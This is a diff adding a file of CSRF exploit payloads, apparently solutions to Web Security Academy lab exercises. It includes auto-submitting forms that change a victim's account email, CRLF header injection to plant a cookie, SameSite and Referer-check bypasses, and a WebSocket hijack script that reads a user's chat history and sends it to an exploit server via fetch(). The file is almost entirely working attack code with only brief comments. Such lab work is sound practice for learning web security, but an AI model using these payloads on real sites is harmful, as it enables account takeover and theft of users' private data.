@@ -1,0 +1,130 @@
+<!-- No CSRF token required (rare) -->
+<html>
+  <form
+    action="https://0ac1001f0489a73980483fb100b700ed.web-security-academy.net/my-account/change-email"
+    method="post"
+  >
+    <input type="hidden" name="email" value="hanoi@gmail.com" />
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</html>
+
+<!-- CSRF where token validation depends on request method -->
+<html>
+  <form
+    action="https://0ac1001f0489a73980483fb100b700ed.web-security-academy.net/my-account/change-email"
+    method="get"
+  >
+    <input type="hidden" name="email" value="hanoi@gmail.com" />
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</html>
+
+<!-- CSRF where token is tied to non-session cookie -->
+<html>
+  <body>
+    <form
+      action="https://0aca005304d4bf99813bc5540001009b.web-security-academy.net/my-account/change-email"
+      method="post"
+    >
+      <input type="hidden" name="email" value="abc@gmail.com" />
+      <!-- Inject your own csrf value -->
+      <input
+        type="hidden"
+        name="csrf"
+        value="Wnmoa3vxUvtpyJ9eWJs4KdVm7j2zkfUM"
+      />
+    </form>
+    <!-- Injects our own csrfKey to the cookie using Set-Cookie via the search function -->
+    <img
+      src="https://0a3c005a031637b680eff879004c0094.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=MZBhnlE8HN1FMeNveVCnsagdWdE5wJvC%3b%20SameSite=None"
+      onerror="document.forms[0].submit()"
+    />
+  </body>
+</html>
+
+<!-- SameSite Strict bypass via sibling domain -->
+<script>
+  let newWebSocket = new WebSocket(
+    "wss://0aea004b04f7961c80b94e540071009b.web-security-academy.net/chat"
+  );
+
+  // send READY message to view the chat history
+  newWebSocket.onopen = function (evt) {
+    newWebSocket.send("READY");
+  };
+
+  // receive messages from the chat and send them to the exploit server in base64
+  newWebSocket.onmessage = function (evt) {
+    var message = evt.data;
+    fetch(
+      "https://exploit-0a7400b304f4964680344d3201450054.exploit-server.net/exploit?message=" +
+        btoa(message)
+    );
+  };
+</script>
+
+<!-- SameSite Lax bypass via cookie refresh -->
+<html>
+  <body>
+    <form
+      action="https://0aca005304d4bf99813bc5540001009b.web-security-academy.net/my-account/change-email"
+      method="post"
+    >
+      <input type="hidden" name="email" value="test123@abc.xyz" />
+    </form>
+    <script>
+      // Bypass pop up block
+      window.onclick = function () {
+        window.open(
+          "https://0aca005304d4bf99813bc5540001009b.web-security-academy.net/social-login"
+        );
+        setTimeout(function () {
+          document.forms[0].submit();
+        }, 5000);
+      };
+    </script>
+  </body>
+</html>
+
+<!-- CSRF where Referer validation depends on header being present-->
+<html>
+  <head>
+    <!-- exclude the referrer (contain the URL of the page that is making the request) so the browser won't check it -->
+    <meta name="referrer" content="no-referrer" />
+  </head>
+  <body>
+    <form
+      action="https://0aca005304d4bf99813bc5540001009b.web-security-academy.net/my-account/change-email"
+      method="post"
+    >
+      <input type="hidden" name="email" value="test123@abc.xyz" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+<!-- CSRF with broken Referer validation -->
+<html>
+  <head>
+    <!-- Send the origin, path, and query string when performing any request, regardless of security -->
+    <meta name="referrer" content="unsafe-url" />
+  </head>
+  <body>
+    <form
+      action="https://0aca005304d4bf99813bc5540001009b.web-security-academy.net/my-account/change-email"
+      method="post"
+    >
+      <input type="hidden" name="email" value="test123@abc.xyz" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
